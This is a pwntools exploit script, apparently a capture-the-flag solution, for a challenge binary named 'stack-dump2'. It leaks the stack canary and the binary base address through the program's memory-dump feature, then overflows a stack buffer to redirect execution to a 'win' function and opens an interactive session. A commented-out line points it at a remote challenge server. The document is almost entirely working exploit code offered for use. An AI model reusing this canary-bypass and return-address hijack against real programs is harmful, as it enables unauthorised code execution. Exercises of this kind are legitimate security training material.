from pwn import *

#p = remote('plsdonthaq.me', 5002)
p = process('./stack-dump2')

p.recvuntil('stack pointer ')

ebp_0x71 = int(p.recvline().rstrip(), 16)
ebp = ebp_0x71 + 0x71

p.recvlines(4)

p.sendline('a')

# length is 4bytes of address + \n + \x00
p.sendlineafter('len: ', b'6')
# canary is kept at ebp-0x8
p.sendline(p32(ebp-0x8))
p.recvlines(6)
p.sendline('b')

p.recvuntil(': ')
canary = p.recvline().rstrip()[:4]
p.recvlines(4)
p.sendline(b'c')

base_addr = b'0x'+p.recvuntil('-',drop=True)
win_addr = int(base_addr, 16) + 0x076d
p.sendlineafter('d) quit\n', b'a')
# buffer at 0x68, +0x8 to account for return addr from ebp+0x4 to ebp+0x8
# and +0x2 to account for the \n and added null terminator
p.sendlineafter('len: ', str(0x68+0x8+0x2).encode())

precanary_padding = b'A'*0x60
postcanary_padding = b'A'*0x8

payload = precanary_padding + canary + postcanary_padding + p32(win_addr)

p.sendline(payload)
p.recvlines(6)
p.sendline(b'd')

p.interactive()

# canary at ebp-0x8

# useful pointer is ebp-0x71

# ebx is constant 0x1fa8

# win is at binary offset 0x076d

# memory at %p is value in ebp-0x68

# memory is also dumped from address kept in ebp-0x68


